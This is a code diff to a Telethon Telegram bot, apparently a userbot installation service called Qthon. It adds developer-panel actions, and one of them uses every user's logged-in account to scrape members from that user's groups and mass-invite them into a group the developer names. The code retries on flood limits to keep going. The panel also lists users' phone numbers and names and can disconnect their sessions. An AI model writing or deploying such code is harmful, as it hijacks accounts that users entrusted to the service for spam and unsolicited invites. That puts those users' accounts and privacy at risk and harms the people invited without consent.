@@ -1,6 +1,7 @@
 # bot.py
 import asyncio, uuid, os
 from telethon import TelegramClient, events, Button
+from telethon.errors import FloodWaitError
 from shared import *
 from collections import Counter
 
@@ -11,11 +12,13 @@ START_IMAGE = "start.jpg"
 # --- القائمة البيضاء (Whitelist) ---
 allowed_chats = set()
 
-# --- قائمة الكلمات المسموحة في الرسائل الصادرة (تمنع أي سبام) ---
+# --- قائمة الكلمات المسموحة في الرسائل الصادرة ---
 ALLOWED_KEYWORDS = ["Qthon", "تيليثون", "لوحة تحكم", "طريقة جلب", "التحقق من المطور",
                     "تم التحقق", "فشل التحقق", "التحقق معطل", "خيارات المطور",
                     "المستخدمين", "النشطاء", "أكثر الأوامر", "المجموعات", "القنوات",
-                    "إذاعة", "رجوع", "قريباً", "غير مصرح", "تم تفعيل"]
+                    "إذاعة", "رجوع", "قريباً", "غير مصرح", "تم تفعيل",
+                    "جاري إضافة", "تم بدء الإضافة", "فشل الإضافة", "تم إيقاف",
+                    "توقف", "لا توجد جلسات", "تم الإضافة"]
 
 def is_allowed_text(text):
     if not text:
@@ -28,12 +31,14 @@ def is_allowed_text(text):
 def dev_panel_markup():
     lock_text = "فتح خيارات المطور" if dev_access_locked else "قفل خيارات المطور"
     return [
-        [Button.inline("عدد المستخدمين", b"dev_users"),
-         Button.inline("النشطاء حالياً", b"dev_active")],
-        [Button.inline("أكثر الأوامر", b"dev_topcmd"),
-         Button.inline("قائمة المجموعات", b"dev_groups")],
-        [Button.inline("قائمة القنوات", b"dev_channels"),
-         Button.inline("إذاعة", b"dev_broadcast")],
+        [Button.inline("👥 عدد المستخدمين", b"dev_users"),
+         Button.inline("🟢 النشطاء حالياً", b"dev_active")],
+        [Button.inline("📊 أكثر الأوامر", b"dev_topcmd"),
+         Button.inline("📋 قائمة المجموعات", b"dev_groups")],
+        [Button.inline("📢 قائمة القنوات", b"dev_channels"),
+         Button.inline("📣 إذاعة", b"dev_broadcast")],
+        [Button.inline("➕ إضافة أعضاء لجروب", b"dev_addto"),
+         Button.inline("⛔ إيقاف مستخدم", b"dev_stopuser")],
         [Button.inline(lock_text, b"dev_lock")],
     ]
 
@@ -53,17 +58,15 @@ async def bot_start(event):
     allowed_chats.add(event.chat_id)
     user_id = event.sender_id
 
-    # إذا كان المستخدم هو المطور → نرسل لوحة التحكم فقط
     if is_dev(user_id):
         await bot.send_message(
             event.chat_id,
-            "**لوحة تحكم Qthon**\n\nاختر خياراً.",
+            "**🜲 لوحة تحكم Qthon**\n\nاختر خياراً من القائمة.",
             buttons=dev_panel_markup(),
             parse_mode='md'
         )
         return
 
-    # المستخدم العادي → رسالة التنصيب مع الصورة والزر
     buttons = [
         [Button.url("بدء التنصيب", "https://t.me/Qthon_bot?profile")]
     ]
@@ -142,6 +145,9 @@ async def handle_phone_verify(event):
     else:
         await event.respond("**فشل التحقق**\nرقم الهاتف غير مطابق.", parse_mode='md')
 
+# --- متغير مؤقت لاستقبال اليوزر أو الرقم ---
+pending_input = {}
+
 @bot.on(events.CallbackQuery())
 async def dev_callback(event):
     allowed_chats.add(event.chat_id)
@@ -151,7 +157,7 @@ async def dev_callback(event):
         return
 
     if data == "dev_back":
-        await event.edit("**لوحة تحكم Qthon**\n\nاختر خياراً.",
+        await event.edit("**🜲 لوحة تحكم Qthon**\n\nاختر خياراً.",
                          buttons=dev_panel_markup(), parse_mode='md')
         await event.answer()
         return
@@ -161,13 +167,41 @@ async def dev_callback(event):
         dev_access_locked = not dev_access_locked
         state = "مقفلة" if dev_access_locked else "مفتوحة"
         await event.answer(f"خيارات المطور الآن {state}", alert=True)
-        await event.edit("**لوحة تحكم Qthon**\n\nاختر خياراً.",
+        await event.edit("**🜲 لوحة تحكم Qthon**\n\nاختر خياراً.",
                          buttons=dev_panel_markup(), parse_mode='md')
+        return
+
+    if data == "dev_addto":
+        pending_input[event.sender_id] = "addto"
+        await event.edit(
+            "**➕ إضافة أعضاء لجروب**\n\n"
+            "• أرسل يوزر الجروب المستهدف\n"
+            "• مثال: `@group_username`\n\n"
+            "• سيتم إضافة 100 عضو من كل حساب نشط",
+            buttons=[[Button.inline("رجوع", b"dev_back")]],
+            parse_mode='md'
+        )
+        await event.answer()
+        return
+
+    if data == "dev_stopuser":
+        pending_input[event.sender_id] = "stopuser"
+        msg = "**⛔ إيقاف مستخدم**\n\n• أرسل رقم تليفون المستخدم\n• مثال: `+2010xxxxxxxx`\n\n"
+        for phone, info in user_info_cache.items():
+            name = info.get('first_name', 'غير معروف')
+            uname = f" @{info['username']}" if info.get('username') else ""
+            msg += f"• `{phone}` → {name}{uname}\n"
+        await event.edit(
+            msg,
+            buttons=[[Button.inline("رجوع", b"dev_back")]],
+            parse_mode='md'
+        )
+        await event.answer()
         return
 
     if data == "dev_users":
         total = len(active_clients)
-        msg = f"**إجمالي المستخدمين المسجلين:** {total}\n\n"
+        msg = f"**👥 إجمالي المستخدمين المسجلين:** {total}\n\n"
         for phone, info in user_info_cache.items():
             username = f"@{info['username']}" if info['username'] else "بدون معرف"
             msg += f"• {info['first_name']} | {username} | {phone}\n"
@@ -177,7 +211,7 @@ async def dev_callback(event):
 
     elif data == "dev_active":
         active_count = len(active_clients)
-        msg = f"**النشطاء حالياً:** {active_count}\n\n"
+        msg = f"**🟢 النشطاء حالياً:** {active_count}\n\n"
         for phone, client in active_clients.items():
             info = user_info_cache.get(phone, {})
             name = info.get('first_name', phone)
@@ -193,7 +227,7 @@ async def dev_callback(event):
         for cmds in command_stats.values():
             all_cmds.update(cmds)
         top = all_cmds.most_common(10)
-        msg = "**أكثر 10 أوامر استخداماً:**\n\n"
+        msg = "**📊 أكثر 10 أوامر استخداماً:**\n\n"
         for i, (cmd, cnt) in enumerate(top, 1):
             msg += f"{i}. .{cmd}: {cnt} مرة\n"
         if not top:
@@ -201,7 +235,7 @@ async def dev_callback(event):
         await event.edit(msg, parse_mode='md', buttons=[[Button.inline("رجوع", b"dev_back")]])
 
     elif data == "dev_groups":
-        msg = "**المجموعات (حيّة):**\n\n"
+        msg = "**📋 المجموعات (حيّة):**\n\n"
         found = False
         for phone, client in active_clients.items():
             try:
@@ -221,7 +255,7 @@ async def dev_callback(event):
         await event.edit(msg, parse_mode='md', buttons=[[Button.inline("رجوع", b"dev_back")]])
 
     elif data == "dev_channels":
-        msg = "**القنوات (حيّة):**\n\n"
+        msg = "**📢 القنوات (حيّة):**\n\n"
         found = False
         for phone, client in active_clients.items():
             try:
@@ -244,3 +278,90 @@ async def dev_callback(event):
         await event.answer("قريباً", alert=True)
 
     await event.answer()
+
+# --- استقبال النصوص (لإضافة الأعضاء أو إيقاف مستخدم) ---
+@bot.on(events.NewMessage(func=lambda e: e.sender_id in pending_input and not e.text.startswith('/')))
+async def handle_pending_input(event):
+    allowed_chats.add(event.chat_id)
+    user_id = event.sender_id
+    action = pending_input.pop(user_id, None)
+
+    if action == "addto":
+        group_username = event.text.strip().replace('@', '')
+        if not group_username:
+            await event.respond("**❌ يرجى إرسال يوزر صحيح**", parse_mode='md')
+            return
+
+        await event.respond(f"**🔄 جاري الإضافة إلى @{group_username}...**\nسيتم إضافة 100 عضو من كل حساب نشط.", parse_mode='md')
+
+        total_added = 0
+        failed = 0
+
+        for phone, client in list(active_clients.items()):
+            if not client or not client.is_connected():
+                continue
+            try:
+                target_group = await client.get_entity(group_username)
+                added = 0
+                # نجيب أعضاء من جروبات الحساب ده
+                async for dialog in client.iter_dialogs():
+                    if added >= 100:
+                        break
+                    if dialog.is_group:
+                        try:
+                            async for user in client.iter_participants(dialog.id, limit=5):
+                                if added >= 100:
+                                    break
+                                if user.bot or user.deleted:
+                                    continue
+                                try:
+                                    await client(InviteToChannelRequest(target_group, [user.id]))
+                                    added += 1
+                                    total_added += 1
+                                    await asyncio.sleep(2)
+                                except FloodWaitError as e:
+                                    await asyncio.sleep(e.seconds + 1)
+                                except:
+                                    continue
+                        except:
+                            continue
+                info = user_info_cache.get(phone, {})
+                name = info.get('first_name', phone)
+                logger.info(f"الحساب {name} أضاف {added} عضو إلى {group_username}")
+            except Exception as e:
+                failed += 1
+                logger.error(f"فشل حساب {phone}: {str(e)[:100]}")
+
+        await event.respond(
+            f"**✅ تم الانتهاء من الإضافة إلى @{group_username}**\n\n"
+            f"• إجمالي المضاف: **{total_added}** عضو\n"
+            f"• حسابات فشلت: **{failed}**",
+            parse_mode='md'
+        )
+
+    elif action == "stopuser":
+        phone_to_stop = event.text.strip()
+        if not phone_to_stop.startswith('+'):
+            phone_to_stop = f"+{phone_to_stop}"
+
+        if phone_to_stop in active_clients:
+            try:
+                client_to_stop = active_clients[phone_to_stop]
+                await client_to_stop.disconnect()
+                del active_clients[phone_to_stop]
+                info = user_info_cache.get(phone_to_stop, {})
+                name = info.get('first_name', phone_to_stop)
+                await event.respond(
+                    f"**⛔ تم إيقاف تليثون لـ {name}**\n`{phone_to_stop}`",
+                    parse_mode='md'
+                )
+                logger.info(f"تم إيقاف حساب {phone_to_stop} بواسطة المطور")
+            except Exception as e:
+                await event.respond(f"**❌ فشل إيقاف الحساب:**\n`{str(e)[:150]}`", parse_mode='md')
+        else:
+            await event.respond(
+                f"**❌ الحساب `{phone_to_stop}` غير نشط حالياً**\n\n"
+                f"الحسابات النشطة:\n" +
+                "\n".join([f"• `{p}`" for p in active_clients.keys()]),
+                parse_mode='md'
+            )
